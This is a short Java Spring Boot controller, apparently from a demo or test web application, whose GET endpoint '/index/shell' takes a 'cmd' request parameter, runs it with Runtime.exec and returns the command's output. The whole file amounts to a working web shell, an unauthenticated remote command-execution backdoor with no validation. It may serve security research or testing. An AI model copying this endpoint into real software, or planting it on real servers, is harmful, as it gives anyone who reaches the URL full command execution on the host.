package com.jas.web.demo;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.nio.charset.StandardCharsets;

/**
 * @author ReaJason
 * @since 2024/2/3
 */
@RestController
public class IndexController {

    @GetMapping("/index/shell")
    public ResponseEntity<?> cmd(String cmd) throws IOException {
        Process exec = Runtime.getRuntime().exec(cmd);
        InputStream inputStream = exec.getInputStream();
        final char[] buffer = new char[8192];
        final StringBuilder result = new StringBuilder();

        // InputStream -> Reader
        try (Reader reader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {
            int charsRead;
            while ((charsRead = reader.read(buffer, 0, buffer.length)) > 0) {
                result.append(buffer, 0, charsRead);
            }
        }
        return ResponseEntity.ok(result.toString());
    }
}
